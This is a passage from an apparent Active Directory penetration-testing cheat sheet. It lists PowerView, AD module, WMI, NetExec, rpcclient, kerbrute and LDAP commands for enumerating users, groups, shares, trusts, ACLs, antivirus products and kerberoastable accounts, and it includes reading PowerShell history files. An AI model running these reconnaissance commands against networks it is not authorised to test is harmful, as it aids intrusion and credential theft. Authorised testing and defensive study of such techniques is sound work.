<span class="c"># AD Module</span>
<span class="nb">Get-ADGroupMember</span> <span class="n">-Identity</span> <span class="s2">"Domain Admins"</span> <span class="n">-Recursive</span> <span class="c"># By group</span>
<span class="nb">Get-ADPrincipalGroupMembership</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="c"># By username</span>
</code></pre></div>
<p><strong>Note</strong>: <code>-Recurse</code> and <code>-Recursive</code> are needed to expand memberships of nested groups.</p>
<p>Enumerate <strong>local</strong> groups membership (needs administrator privileges on non-dc machines)(<code>Powerview</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>
<span class="nb">Get-NetLocalGroupMember</span> <span class="n">-GroupName</span> <span class="p">&lt;</span><span class="nb">group </span><span class="n">name</span><span class="p">&gt;</span>
</code></pre></div>
<p>Get domain policy (<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-DomainPolicy</span> <span class="p">[</span><span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;]</span>
<span class="p">(</span><span class="nb">Get-DomainPolicy</span><span class="p">).</span><span class="s2">"SystemAccess"</span>
<span class="p">(</span><span class="nb">Get-DomainPolicy</span><span class="p">).</span><span class="s2">"KerberosPolicy"</span>
</code></pre></div>
<p>Get the list of active logged users on a computer (needs admin privileges on the target)(<code>Powerview</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-NetLoggedon</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>
</code></pre></div>
<p>Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)(<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-LoggedonLocal</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>
<span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>
</code></pre></div>
<p>Get the last logged user on a computer (needs administrative rights and
remote registry on the target)(<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-LastLoggedOn</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">servername</span><span class="p">&gt;</span>
</code></pre></div>
<p>Enumerate SMB shares for current computer (<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-SmbShare</span>
</code></pre></div>
<p>Find shares on hosts in current domain (<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-ShareFinder</span> <span class="n">-Verbose</span>
<span class="nb">Invoke-ShareFinder</span> <span class="n">-Verbose</span> <span class="n">-ExcludeStandard</span> <span class="n">-ExcludePrint</span> <span class="n">-ExcludeIPC</span> <span class="c"># exclude default shares</span>
<span class="nb">Invoke-ShareFinder</span> <span class="n">-Verbose</span> <span class="n">-ExcludeStandard</span> <span class="n">-ExcludePrint</span> <span class="n">-ExcludeIPC</span> <span class="c"># exclude default shares </span>
</code></pre></div>
<p>Find sensitive files on computers in the domain (<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-FileFinder</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Get all file-servers of the domain (<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-NetFileServer</span>
</code></pre></div>
<p>Get list of GPO in current domain</p>
<div class="highlight"><pre><span></span><code><span class="c">#PowerView</span>
<span class="nb">Get-NetGPO</span>

<span class="c">#AD Module</span>
<span class="nb">Get-GPO</span> <span class="n">-All</span>
<span class="nb">Get-GPResultantSetOfPolicy</span> <span class="n">-ReportType</span> <span class="n">Html</span> <span class="n">-Path</span> <span class="p">&lt;</span><span class="n">output</span> <span class="n">path</span><span class="p">&gt;</span>
</code></pre></div>
<p>Get list of GPOs applied to a computer:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetGPO</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span> 
</code></pre></div>
<p>Get list of permissions associated to a GPO:</p>
<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
<span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">"&lt;gpo name&gt;"</span> <span class="n">-All</span>
</code></pre></div>
<p>Get list of GPO restricted groups:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetGPOGroup</span>
</code></pre></div>
<p>Get users which are in a local group of a machine using GPO restricted groups:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Find-GPOComputerAdmin</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>
</code></pre></div>
<p>Get machines where the given user is member of a specific GPO restricted group:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Find-GPOLocation</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Get OUs in a domain:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetOU</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADOrganizationalUnit</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span>
</code></pre></div>
<p>Get GPO applied on an OU:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetGPO</span> <span class="n">-Identity</span> <span class="s2">"{&lt;gplink attribute's CN part from Get-NetOU&gt;}"</span>

<span class="c"># AD Module</span>
<span class="nb">Get-GPO</span> <span class="n">-Guid</span> <span class="s2">"&lt;gPLink attributes's CN part from Get-ADOrganizationalUnit&gt;"</span>
</code></pre></div>
<p>Enumerate ACLs :</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-ObjectAcl</span> <span class="n">-ResolveGUIDs</span> <span class="c"># get all</span>
<span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">username</span> <span class="n">or</span> <span class="n">group</span><span class="p">&gt;</span>  <span class="n">-ResolveGUIDs</span> <span class="c"># by username or group</span>
<span class="nb">Get-ObjectAcl</span> <span class="n">-ADSpath</span> <span class="s2">"LDAP://&lt;Object DN&gt;"</span> <span class="n">-ResolveGUIDs</span> <span class="n">-Verbose</span>
<span class="nb">Get-PathAcl</span> <span class="n">-Path</span> <span class="s2">"&lt;path&gt;"</span>
<span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span> <span class="c"># Look for intersing ACEs</span>

<span class="c"># AD Module</span>
<span class="p">(</span><span class="nb">Get-Acl</span> <span class="s1">'AD:\&lt;Object DN&gt;'</span><span class="p">).</span><span class="n">Access</span>
</code></pre></div>
<p>Get details about a forest:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetForest</span>
<span class="nb">Get-NetForest</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">forest</span> <span class="n">name</span><span class="p">&gt;</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADForest</span>
<span class="nb">Get-ADForest</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">forest</span> <span class="n">name</span><span class="p">&gt;</span>
</code></pre></div>
<p>Get all domains in a forest:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetForestDomain</span>
<span class="nb">Get-NetForestDomain</span> <span class="n">-Forest</span> <span class="p">&lt;</span><span class="n">forest</span> <span class="n">name</span><span class="p">&gt;</span>
<span class="nb">Get-NetForestTrust</span>
<span class="nb">Get-NetForestTrust</span> <span class="n">-Forest</span> <span class="p">&lt;</span><span class="n">forest</span> <span class="n">domain</span><span class="p">&gt;</span>

<span class="c"># AD Module</span>
<span class="p">(</span><span class="nb">Get-ADForest</span><span class="p">).</span><span class="n">Domains</span>
<span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="s1">'msDS-TrustForestTrustInfo -ne "$null"'</span>
</code></pre></div>
<p>Enumerate domains and forests trusts:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetDomainTrust</span>
<span class="nb">Get-NetDomainTrust</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
</code></pre></div>
<p>Get all global catalogs for a forest:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetForestCatalog</span>
<span class="nb">Get-NetForestCatalog</span> <span class="n">-Forest</span> <span class="p">&lt;</span><span class="n">forest</span> <span class="n">name</span><span class="p">&gt;</span>

<span class="c"># AD Module</span>
<span class="p">(</span><span class="nb">Get-ADForest</span><span class="p">).</span><span class="n">GlobalCatalogs</span> 
</code></pre></div>
<p>Get all local users that haven't password:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_UserAccount</span> <span class="n">-Filter</span> <span class="s2">"LocalAccount=True"</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">PasswordRequired</span> <span class="p">|</span> <span class="nb">where </span><span class="n">-Property</span> <span class="n">PasswordRequired</span> <span class="o">-NE</span> <span class="n">True</span>
</code></pre></div>
<p>Get PowerShell history:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-Content</span> <span class="nv">$env:USERPROFILE</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadline</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<h4 id="using-net-classes">Using .NET classes</h4>
<p>Use .NET classes to enumerate domains:</p>
<div class="highlight"><pre><span></span><code><span class="nv">$ADClass</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span>
<span class="nv">$ADClass</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
</code></pre></div>
<p>References:</p>
<ul>
<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/">PowerView Docs</a></li>
</ul>
<h4 id="wmi-enumeration">WMI Enumeration</h4>
<p>Enumerate computers on which the current user has <em>local administrator</em> privileges:</p>
<div class="highlight"><pre><span></span><code><span class="nv">$pcs</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">ds_cn</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$pc</span> <span class="k">in</span> <span class="nv">$pcs</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_computersystem</span> <span class="n">-ComputerName</span> <span class="nv">$pc</span> <span class="n">-ErrorAction</span> <span class="n">silentlycontinue</span><span class="p">).</span><span class="n">name</span>
<span class="p">}</span>
</code></pre></div>
<p>Finding the domain name:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_domain</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_dc</span><span class="p">,</span> <span class="n">ds_distinguishedname</span><span class="p">,</span> <span class="n">pscomputername</span>
</code></pre></div>
<p>Getting the domain policy:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_domain</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_lockoutduration</span><span class="p">,</span> <span class="n">ds_lockoutobservationwindow</span><span class="p">,</span> <span class="n">ds_lockoutthreshold</span><span class="p">,</span> <span class="n">ds_maxpwdage</span><span class="p">,</span> <span class="n">ds_minpwdage</span><span class="p">,</span> <span class="n">ds_minpwdlength</span><span class="p">,</span> <span class="n">ds_pwdhistorylength</span><span class="p">,</span> <span class="n">ds_pwdproperties</span>
</code></pre></div>
<p>*Note: All the timestamps in the above output are stored as negative &ldquo;filetimes&rdquo;, i.e. represented as negative integers of 100 nanosecond timeslices. </p>
<ul>
<li>Divide those values by <em>-600000000</em> to obtain the amount of minutes.</li>
</ul>
<p>Finding workstations and the domain controller:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ds_useraccountcontrol</span> <span class="o">-match</span> <span class="p">&lt;</span><span class="n">user</span> <span class="nb">type </span><span class="n">constant</span><span class="p">&gt;}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_cn</span><span class="p">,</span> <span class="n">ds_dnshostname</span><span class="p">,</span> <span class="n">ds_operatingsystem</span><span class="p">,</span> <span class="n">ds_lastlogon</span><span class="p">,</span> <span class="n">ds_pwdlastset</span>
</code></pre></div>
<p>where <code>&lt;user type constant&gt;</code> is a User Account Control (UAC) constant mapped as follows:</p>
<table>
<thead>
<tr>
<th>User Type</th>
<th>Hex Value</th>
<th>Constants</th>
</tr>
</thead>
<tbody>
<tr>
<td>Normal User</td>
<td>0x200</td>
<td>512</td>
</tr>
<tr>
<td>Workstation/Server</td>
<td>0x1000</td>
<td>4096</td>
</tr>
<tr>
<td>Domain Controller</td>
<td>0x82000</td>
<td>532480</td>
</tr>
</tbody>
</table>
<p>Finding users:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_useraccount</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">accounttype</span>
</code></pre></div>
<p>It's possible to filter by <code>AccountType</code> property with the following contants:</p>
<table>
<thead>
<tr>
<th>Account Type</th>
<th>Identifier</th>
<th>Constant</th>
</tr>
</thead>
<tbody>
<tr>
<td>Temporary Duplicate Account</td>
<td><code>UF_TEMP_DUPLICATE_ACCOUNT</code></td>
<td>256</td>
</tr>
<tr>
<td>Normal Account</td>
<td><code>UF_NORMAL_ACCOUNT</code></td>
<td>512</td>
</tr>
<tr>
<td>Interdomain Trust Account</td>
<td><code>UF_INTERDOMAIN_TRUST_ACCOUNT</code></td>
<td>2048</td>
</tr>
<tr>
<td>Workstation Trust Account</td>
<td><code>UF_WORKSTATION_TRUST_ACCOUNT</code></td>
<td>4096</td>
</tr>
<tr>
<td>Server Trust Account</td>
<td><code>UF_SERVER_TRUST_ACCOUNT</code></td>
<td>8192</td>
</tr>
</tbody>
</table>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_useraccount</span> <span class="n">-Filter</span> <span class="s1">'accounttype=512'</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">accounttype</span>
</code></pre></div>
<p>Filter users by domain:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_useraccount</span> <span class="n">-Filter</span> <span class="s1">'domain="&lt;domain name&gt;"'</span> <span class="p">|</span> <span class="nb">select </span><span class="n">caption</span>
</code></pre></div>
<p>Enumerating currently logged-on users:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_loggedonuser</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span><span class="no">[wmi]</span><span class="nv">$_</span><span class="p">.</span><span class="n">antecedent</span><span class="p">}</span>
</code></pre></div>
<p>Enumerating groups for a domain:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_groupindomain</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span><span class="no">[wmi]</span><span class="nv">$_</span><span class="p">.</span><span class="n">partcomponent</span><span class="p">}</span>
</code></pre></div>
<p>Enumerating group memberships:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_groupuser</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">groupcomponent</span> <span class="o">-match</span> <span class="s1">'&lt;goup name&gt;'</span> <span class="p">}</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span><span class="no">[wmi]</span><span class="nv">$_</span><span class="p">.</span><span class="n">partcomponent</span><span class="p">}</span>
</code></pre></div>
<p>Enumerate all the machines in the domain:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_cn</span>
</code></pre></div>
<p>Enumerate antivirus on workstations:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">securitycenter2</span> <span class="n">-Class</span> <span class="n">antivirusproduct</span> <span class="c"># see note below</span>
<span class="nb">Get-CimInstance</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">/</span><span class="n">SecurityCenter2</span> <span class="n">-ClassName</span> <span class="n">AntivirusProduct</span> <span class="c"># see note below</span>
<span class="nb">Get-Service</span> <span class="n">WinDefend</span> <span class="c"># Check for windows defender</span>
<span class="nb">Get-Service</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*Defend*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*McAfee*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*Symantec*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*Kaspersky*"</span> <span class="p">}</span>
<span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ProcessName</span> <span class="o">-like</span> <span class="s2">"*McShield*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ProcessName</span> <span class="o">-like</span> <span class="s2">"*avp*"</span> <span class="p">}</span>
</code></pre></div>
<p>*Note: these commands would not work with Windows Server 2019</p>
<h3 id="linux-enumeration_1">Linux Enumeration</h3>
<p>Get domain information with <code>adcli</code>:</p>
<div class="highlight"><pre><span></span><code>adcli<span class="w"> </span>info<span class="w"> </span>&lt;domain&gt;
</code></pre></div>
<h3 id="external-enumeration">External Enumeration</h3>
<p>Enumerate computers:</p>
<div class="highlight"><pre><span></span><code>impacket-GetADComputers<span class="w"> </span>username<span class="o">[</span>:password<span class="o">]</span>@target
</code></pre></div>
<p>Enumerate users remotely:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># NetExec - anonymously</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>--users

<span class="c1"># NetExec - authenticated</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--users
nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--users

<span class="c1"># rpcclient - anonymously</span>
rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;domain&gt;\\"</span><span class="w"> </span>&lt;dc<span class="w"> </span>ip&gt;<span class="w"> </span>-N
$&gt;<span class="w"> </span>enumdomusers

<span class="c1"># nmap - using a wordlist (OSINT)*</span>
nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="o">=</span>krb5-enum-users<span class="w"> </span>--script-args<span class="o">=</span><span class="s2">"krb5-enum-users.realm='&lt;root domain&gt;',userdb=&lt;username wordlist&gt;"</span><span class="w"> </span>&lt;root<span class="w"> </span>dc<span class="w"> </span>ip&gt;
</code></pre></div>
<p>*<strong>Note</strong>: as referred <a href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html">here</a>, this method will not increase <code>badpwdcount</code> since it's not performing a logon but it's using the <code>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</code> Kerberos' error code to determine if the username is invalid.</p>
<p>Enumerate users remotely with <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:</p>
<div class="highlight"><pre><span></span><code><span class="n">kerbrute</span><span class="w"> </span><span class="n">userenum</span><span class="w"> </span><span class="o">--</span><span class="n">dc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">domain</span><span class="w"> </span><span class="n">controller</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">wordlist</span><span class="o">&gt;</span>
</code></pre></div>
<p>Enumerate groups remotely:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># rpcclient - anonymously</span>
rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;domain&gt;\\"</span><span class="w"> </span>&lt;dc<span class="w"> </span>ip&gt;<span class="w"> </span>-N
$&gt;<span class="w"> </span>enumdomgroups

<span class="c1"># NetExec - authenticated</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--groups
nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--groups
</code></pre></div>
<p>Enumerate groups memberships remoteley:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># All users</span>
net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>members<span class="w"> </span><span class="s1">'Domain Users'</span><span class="w"> </span>-W<span class="w"> </span><span class="s1">'&lt;domain&gt;'</span><span class="w"> </span>-I<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-U<span class="w"> </span><span class="s1">'%'</span>

<span class="c1"># Specific group</span>
net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>members<span class="w"> </span><span class="s1">'&lt;group&gt;'</span><span class="w"> </span>-W<span class="w"> </span><span class="s1">'&lt;domain&gt;'</span><span class="w"> </span>-I<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-U<span class="w"> </span><span class="s1">'%'</span>
</code></pre></div>
<p>Enumerate password policy:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># NetExec - anonymously</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>--pass-pol

<span class="c1"># NetExec - authenticated</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--pass-pol
</code></pre></div>
<p>Enumerate users trusted for delegation:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--trusted-for-delegation
</code></pre></div>
<p>Enumerate users with password not required:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--password-not-required
</code></pre></div>
<p>Enumerate shares:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># NetExec - anonymously</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">'anonymous'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--share

<span class="c1"># NetExec - authenticated</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--shares
</code></pre></div>
<p>Enumerate Domain SID:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--get-sid
</code></pre></div>
<p>Enumerate users, groups, group memberships, password policy, shares, etc with <code>enum4linux</code>:</p>
<div class="highlight"><pre><span></span><code><span class="n">enum4linux</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">host</span><span class="o">&gt;</span>
</code></pre></div>
<p>Use <code>ldapsearch</code> to run queries against a DC:</p>
<div class="highlight"><pre><span></span><code>ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;dc<span class="w"> </span>ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">"&lt;user&gt;@&lt;domain FQDN&gt;"</span><span class="w"> </span>-w<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-b<span class="w"> </span><span class="s1">'&lt;base DN&gt;'</span><span class="w"> </span><span class="s1">'&lt;query&gt;'</span>
</code></pre></div>
<p><strong>Note</strong>: <code>baseDN</code> for <code>this.domain.local</code> is <code>DC=this, DC=domain, DC=local</code></p>
<p>Use <code>netexec</code> to run queries against a DC:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--query<span class="w"> </span>&lt;query&gt;<span class="w"> </span>&lt;filter&gt;
</code></pre></div>
<p><strong>Note</strong>: <code>&lt;filter&gt;</code> is the list of attributes to retrieve; empty for all.</p>
<p>Common LDAP queries for Active Directory Pentesting (source <a href="https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/">here - no more accessible</a> ):</p>
<div class="highlight"><pre><span></span><code><span class="o">#</span><span class="w"> </span><span class="nv">List</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nf">users</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectCategory</span><span class="o">=</span><span class="nv">person</span><span class="p">)(</span><span class="nv">objectClass</span><span class="o">=</span><span class="nv">user</span><span class="p">))</span>

<span class="o">#</span><span class="w"> </span><span class="nv">List</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">kerberoastables</span><span class="w"> </span><span class="nf">users</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectClass</span><span class="o">=</span><span class="nv">user</span><span class="p">)(</span><span class="nv">servicePrincipalName</span><span class="o">=*</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">cn</span><span class="o">=</span><span class="nv">krbtgt</span><span class="p">))(</span><span class="o">!</span><span class="p">(</span><span class="nv">userAccountControl</span><span class="o">:</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">840.113556</span><span class="o">.</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">803</span><span class="o">:=</span><span class="mi">2</span><span class="p">)))</span>

